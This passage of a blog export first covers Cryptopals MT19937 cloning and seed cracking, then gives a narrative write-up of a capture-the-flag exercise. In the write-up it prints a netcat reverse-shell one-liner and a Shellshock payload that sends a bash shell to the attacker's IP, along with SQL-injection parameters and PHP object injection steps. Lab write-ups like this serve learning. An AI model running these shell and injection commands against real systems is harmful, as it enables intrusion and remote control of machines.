self.state[i] = self.int32(f * (self.state[i-1] ^ (self.state[i-1] &gt;&gt; 30)) + i) where f is a magic, 1812433253. In step 2, the RNG outputs a number by taking the next state value, indexed by self.index, and applying some temper transforms before returning it. Then, we increment self.index to use the next state value next time. When we have used up 624 values, we &quot;twist&quot; to generate more. For each state value, the RNG concats the MSB of the current state value and the other 31 bits from the next state value. 1y = (self.state[i] &amp; 0x80000000) + (self.state[(i+1) % 624] &amp; 0x7fffffff) Then it does the A transform above: right-shifts by one, and XORing an additional magic if the current state value is odd. We also XOR with the 397th-next former state variable. 1self.state[i] = self.state[(i+397) % 624] ^ (y&gt;&gt;1) 123if y % 2 != 0: # if odd, xor with another magic number self.state[i] ^= 0x9908b0df Challenge 22 Crack an MT19937 seed Challenge 23 Clone an MT19937 RNG from its output TO clone an MT19937 RNG, we need to find its 624-value internal state. We need to get 624 RNG outputs, and untemper each one. The untempering is very tricky — remember that we did this sequence of two right shifts and two left-shift ANDs: 1234temp ^= (temp &gt;&gt; 11)temp ^= (temp &lt;&lt; 7) &amp; 2636928640temp ^= (temp &lt;&lt; 15) &amp; 4022730752temp ^= (temp &gt;&gt; 18) Let's see how to undo that right shift: 123410110111010111110001000011001110 ^00000000000000000010110111010111 (&gt;&gt;18)=10110111010111110011110100011001 We iterate through all the bits of the output, starting from the leftmost bit 123456for i in xrange(32): output_bit = getBit(binary_str, i) recovered_bit = output_bit ^ getBit(orig_bits, i - shift) # set the bit at index i in the orig_bits to be the recovered bit orig_bits = setBit(orig_bits, i, recovered_bit) While i &lt; shift, getBit() will return 0 as the XOR bit, and recovered_bit will just be the same as the output bit. When i = shift, orig_bits will contain the first shift original bits. getBit(orig_bits, i - shift) will emulate the right-shifted original value, grabbing original bit values, starting from the left of orig_bits. Thus, the XOR of the output_bit and the corresponding index of orig_bits will recover the next original bit. 1234567891011121314When i = 18output: 18___ |10110111010111110011110100011001orig_bits:101101110101111100recovered_bit:output[18] ^ orig_bits[0] 1 ^ 1 = 0 Note that, if shift &lt; 16, at some point each recovered original bit is used immediately in the next iteration of the for loop to recover the next bit. To untemper the left shift + and + xor, we reconstruct the original from the right side, not the left. 1234567891011 24--- | \\/ 1011011101011111000100001 1001110 ^ (&lt;--orig_bits)1010111110001000011001110 0000000 (&lt;&lt; 7) =__________________________________0001100011010111011101111 1001110 &amp;1001110100101100010101101 0000000 (&lt;--2636928640 magic) =__________________________________0001100000000100010101101 0000000 output_bits 123456for i in reversed(xrange(32)): output_bit = getBit(binary_str, i) undo_xor_bit = getBit(orig_bits, i + shift) &amp; getBit(and_val, i) recovered_bit = output_bit ^ undo_xor_bit orig_bits = setBit(orig_bits, i, recovered_bit) While i + shift &gt; 31, the undo_xor_bit is 0, so the last shift bits of orig_bits are identical to the last shift output_bits. Once i &lt;= 31-shift, we begin using values from the right side of orig_bits, emulating the left-shifted value. We then &amp; in the magic bit, and XOR with the output bit to recover the next original bit. 123456789When i = 24undo_xor_bit:orig_bits[31] &amp; and_value[24] 0 1 = 0recovered_bit:output[24] ^ undo_xor_bit = 1 ^ 0 = 1 Our final untemper function is just reversing the 4 tempers, 12345678def untemper(val): val = unRightShiftXor(val, 18) val = unLeftShiftXorAnd(val, 15, 4022730752) val = unLeftShiftXorAnd(val, 7, 2636928640) val = unRightShiftXor(val, 11) and we can easily clone an RNG's 624-value state: 123for i in xrange(624): rand = mt.get_number() cloned_mt_state[i] = untemper(rand) We check that a MT with the cloned state does in fact generate the same numbers as the original MT. Done! 12cloned_mt = MT19937(arbitrary value)cloned_mt.state = cloned_mt_state Challenge 24 Create the MT19937 stream cipher and break it We first need to create an MT19937 stream cipher, which operates much like CTR mode. The keystream, the RNG output, is simply XORed to decrypt or encrypt. We have an oracle that appends some random prefix to our plaintext before encrypting it using the MTR Stream cipher. We first find the prefix length, by simply subtracting the length of the plaintext from the len of oracle-returned ciphertext — the added length in the ciphertext must be due to the prefix, since there's no padding in a stream cipher. 12345678910111213141516171819Step 1:plaintext:AAAAAAAAAAAAAAencrypted in oracle:|rand_prefix|| |RRRRRR AAAAAAAAAAAAAA|len(oracle_ciphertext)|Step 2:padded:|prefix_len|| |AAAAAA AAAAAAAAAAAAAA|len(oracle_ciphertext)| |-COMPARE ENC-| We then iterate through all possible seed values, 1...2&lt;sup&gt;16&lt;/sup&gt;. We create a MT Cipher with each seed, encrypting our padded data and seeing if it gives the same ciphertext as the oracle did. (Remember to slice out the random prefix when comparing!) If the ciphertexts match, we have found our seed! 1234for i in xrange(2**16): padded = 'A' * len(oracle_ciphertext) if MT19937Cipher(i).encrypt(padded)[prefix_len:] == oracle_ciphertext[prefix_len:]: return i","categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://raywang.tech/categories/Crypto/"}],"tags":[{"name":"cryptopals","slug":"cryptopals","permalink":"http://raywang.tech/tags/cryptopals/"}]},{"title":"NSA Cybersprint 2015","slug":"NSA-Cybersprint-2015","date":"2015-12-12T22:38:28.000Z","updated":"2017-09-03T21:39:42.000Z","comments":true,"path":"2015/12/12/NSA-Cybersprint-2015/","link":"","permalink":"http://raywang.tech/2015/12/12/NSA-Cybersprint-2015/","excerpt":"","text":"This is my first writeup, written in 2015 in Word and back-dated Last weekend, I took to some haxxoring in the NSA Cybersprint Competition, a Capture-The-Flag that took place on a simulated corporate network infrastructure. Here’s what it was like. &lt;!-- more --&gt; I’m in the position of a penetration tester who’s been hired to probe the major pharmaceutical company, BWP, for vulnerabilities. In five levels of increasing difficulty, I must explore and exploit an array of BWP’s internal sites. I’m testing an extensive set of abilities, including command-line savvy and knowledge of vulnerabilities and hacking tools. But what’s going to help me most is creative problem-solving. As in the real world, there are a lot of unexpected obstacles that complicate break-ins, but inventing workarounds is key to the sport. I use the Kali Linux distribution as my hacking box, which comes with a massive suite of pentesting tools pre-installed. Booting off an external drive with Kali installed, I have a hacker’s playground. On Level 1, I’m given access to our company’s webmail service and internal social network with the credentials of an unprivileged user. I’ll need to leverage this network throughout my investigation to be able to know which employees work for which teams. Without needing too much technical know-how, I navigate around the directory webpages, picking up information about the organization’s users and teams (called ‘Spaces’). I notice there’s a Sales space, an IT admin space, and a Patent space, among others. In a cute little warmup, I’m asked to craft a social-engineering attack — email a manager asking for a list of patent-holders and their patents in the most innocent way possible. Of course, only a bot responds to me, but this highlights a low-hanging fruit in real life — human beings are often the weakest link in a company’s security chain. A dozen small checkpoints later, I’m on Level 2. There’s a secret IT-only staff page that I need to get access to. As it turns out, only IT staff members can get the password to this site, by requesting the credentials from an online portal. So I log in to the portal as my unprivileged self and notice there’s an online form with my username in an uneditable input field. I tweak the page source to impersonate an IT staff member, send the form, and get an automated response with the IT-only login. Nothing fancy yet, just using the Page Inspector, which is built into browsers like Firefox and Chrome. It’s contrived, sure, but we’re only on Level 2! I login to the secret page. Now, I’m staring at the IT dashboard and a big list of tickets. Let’s look at the most recent ticket — it has to do with a closed-circuit TV (CCTV) server. But there’s a problem — ticket details are restricted to IT staff members, and I don’t have the credentials of any. Kali Linux comes with the Burp Suite, which has a host of capabilities for testing web applications. Setting up a proxy between Burp and the webpage, I can view all the requests and responses that are being sent back and forth, and I can change the contents before sending them along. To do this, I configure my browser to forward connections to Burp’s proxy port and turn on Burp’s ‘intercept’ feature. To view ticket details, it looks like I need to change this show_details parameter in the HTTP GET request to true. I use Burp to intercept my browser’s request to the web page, replacing the parameter and then forwarding the request along. The server, seeing this edited request, displays the details: “CVE-2014-0160”. What’s this? It’s a vulnerability in the OpenSSL library commonly known as Heartbleed, which is classified as a ‘buffer-overread’. This bug in a critical library for secure communications got a lot of attention in 2014 because it compromised hundreds of millions of secure web servers. When one machine on a secure channel tries to ask another if it’s still alive, it’s called the ‘heartbeat’ protocol. One side sends a payload length and payload to the other side, which reads the payload and sends it back. But, if the payload length is greater than the payload data, the responding machine will read back not just the payload, but also anything in memory stored beyond the payload data. This is due to a faulty bounds-check that doesn’t check whether the ‘payload length’ value is actually correct. The penetration testing command-line tool Metasploit comes with a Heartbleed scanner pre-installed. A few inputs and an exploit command later, I’ve leaked the CCTV server’s memory and discovered a password in the leak. Now, I can log in and view video camera feeds. Level 2 is complete. Rolling right along, I now move to Level 3 in which I break into the sales team. I try to log in to the sales submission website, but I’m not a sales staff member, so no luck. It’s time to whip out Burp again to forge some parameters and masquerade as sales. This time, I replace a user parameter in my browser request with the username of a sales team member. It works. On the sales submission site, I notice an error log file, which naively has a set of customer credentials buried in it. With these credentials, I can get onto the Customer Relationship Management (CRM) portal. Now my SQL skills are put to the test. There’s a ‘Sales Analysis’ table on this site, whose backend is a MySQL database. It’s got a list of drug sales to different buyers and their associated dollar amounts. Some of the entries are hidden — some buyers are ‘restricted’, and I can’t see sales involving them. But it seems like the URL takes SQL queries as parameters. Sticking into the request url ?columns=*, I’ve crafted the command SELECT * FROM sales WHERE restricted=0. This command shows all columns in the table, but the server adds a WHERE clause to exclude the entries where the restricted column Now, I want to get rid of that pesky WHERE clause so that I can view all the restricted transactions. I add to the url ?columns=* FROM sales; --. The double hyphens out-comment everything after it, so the WHERE filter is not executed. I can see all entries, including the one company with the restricted field set to 1. We’re not quite done. The restricted company’s name is base64-encoded with a custom alphabet key, and I have to use an online service to decode the name. Moving right along. I check out Level 4. It’s all about Windows. Skip! Level 5 is by far the trickiest set of tasks. I’m given a web application for a personal pill-scheduling site called Digital Pillbox, and I need to find some way to get a reverse shell on the web server. From there, I need to exploit the remote version-control server, and finally, I have to obtain a shell on the build server. How do I get started? Well, there happens to be a .git folder in the web directory that I can access. This folder contains all information about a Git version control repository, which includes configuration, logs, etc. And I know I can recreate the source files if I have this repo. So, I use wget -r --no-parents --reject ‘index.html to mirror the .git folder to a folder on my local machine, recursively downloading the contents from the webpage. Wget is a command-line program for retrieving the contents of web servers. The -r option tells wget to go through all the contents of the directory recursively. The --no-parents prevents the parent directories of the .git folder from being downloaded. --reject ‘index.html’ will reject a set of duplicate files starting in index.html that we don’t need. To recover the source files, I run a git stash in the local .git folder. The source code is a set of PHP scripts for enrolling users, creating users, and logging in to the web app. There’s also a cookies.inc file, which contains PHP code to generate HTTP cookies for app authentication. I have to perform the most difficult task in the competition — a PHP object injection. Basically, I craft a cookie in which I’ve embedded some arbitrary commands and send it to the web app. The app will execute the commands, which will give me a reverse shell. Here we go. I first set up a netcat listener on port 9999 on my computer with nc -l -p 9999. Netcat is the Swiss Army knife of networking. One thing it can do is open a listening port on my machine, which then receives data sent to the port and can send data back to a connecting client. Let’s take a look at the commands I’m going to inject into the web server: 123rm /tmp/fmkfifo /tmp/fcat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc [my ip address] 9999 &gt; /tmp/f I first create a named pipe called /tmp/f, which acts like a first-in first-out queue. Anything sent to this file-like object will be read out in the order that it came in. Now the last command. The /bin/sh -i creates an interactive shell, which is sent with netcat to my IP address on port 9999 and displayed on my terminal. Whatever commands I type on my local machine are directed to /tmp/f with the &gt; /tmp/f. I read in from /tmp/f with cat and pipe the contents to the shell, which executes them in my reverse shell. I could have done this without the named pipe using an option that’s built into netcat, but is often disabled for obvious security reasons — nc –e /bin/sh. The -e option executes the program after the netcat connection is made. But how do I get the web server to run these commands? Well, what’s sent to the server when I login to the app is a serialized User cookie in the user_data parameter. The User object is defined in the user.php file. It so happens that there’s a vulnerable function in the User class called array_filter that executes a string as a function. I grab this user object with Burp and modify it — I add in my list of commands, making sure that array_filter will be called by changing the array_filter value as well. To get the server to accept my evil User object, I use the cookies.inc file to generate a browser cookie from my object and sign it. After forwarding this cookie to the app, I look at my netcat listener, and it appears I have a shell! Now, I get onto the remote git server, which is defined in the .gitconfig file as having IP 10.1.9.88. I locate an RSA private key on the webpage, which allows me to open a Secure Shell (ssh) to the git server. But if the git server’s ssh is configured so that I can’t execute any command I want, I can get around that with the Shellshock vulnerability. Shellshock is an error in Bash shell function definitions. Normally we define a function like some_name() { [some_command] };. In versions of Bash before September 2014, you could add an arbitrary command after the closing of the function definition, and instead of being ignored, it would be executed independently of the function. I open another netcat listener on my machine on port 9998. I run ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /tmp/gitlabkey git@10.1.9.88 ‘() { :; }; /bin/bash -i &gt;&amp; /dev/tcp/[my IP address]/9998 0&lt;&amp;1. Let’s break it down. -o StrictHostkeyChecking=no means that ssh won’t prompt a user to verify that we want to connect, which is standard for new connections. -o UserKnownHostsFile=/dev/null prevents our machine’s hostkey from being added to a file; /dev/null throws away anything written to it. Then, I take advantage of Shellshock. I have an empty function definition with () { :; };, and anything after it will be executed. I create a bash interactive shell that I send across the network to my own machine. &gt;&amp; redirects output and errors to the TCP connection and 0&lt;&amp;1 redirects the TCP tunnel to standard input. So, my netcat listener now has a reverse shell that executes the commands I type and returns the output to me. Finally, getting onto the build server from my Kali machine is done simply with a reverse SSH tunnel. From the Git server, I run ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -R 8080:10.9.1.56:80 root:[my ip address]. The -R option specifies I want to make a reverse tunnel — the tunnel will bridge my local machine and the build server by routing traffic through the Git server. It’s called a reverse tunnel because I’m opening the tunnel on the Git server, but the entry point is on my Kali box. Port 8080 is the port on my machine that’s listening. IP 10.9.1.56 is the build server and port 80 is the port on the build server. One would need a reverse SSH tunnel if the build server is behind a firewall and is only reachable from the Git server. I can’t access either the Git server or the build server directly, unless I set up a reverse tunnel from the Git server that allows me access. Now, if I connect to localhost:8080, I can browse the build server. To run arbitrary commands, I can add them to a scheduled build. After two days of exploring BWP’s systems, I’ve been able to testing all of my hacking and problem-solving chops. With an expertise in Windows, I could have racked up some more points. Level 4, which I skipped, is all about Windows domain controllers, which are servers that allow user access to resources in a Windows workgroup. First, I would have to get access to the file system and then locate some admin credentials. Then, I could use the metasploit exploit /windows/smb/psexec to get full control of the server and dump its stored passwords. But it was quite a well-designed and thorough CTF by the NSA. They’re letting newcomers learn the ropes in Levels 1-3 and distinguishing the best hackers in Levels 4 and 5.","categories":[{"name":"CTF","slug":"CTF","permalink":"http://raywang.tech/categories/CTF/"}],"tags":[{"name":"writeups","slug":"writeups","permalink":"http://raywang.tech/tags/writeups/"}]}]}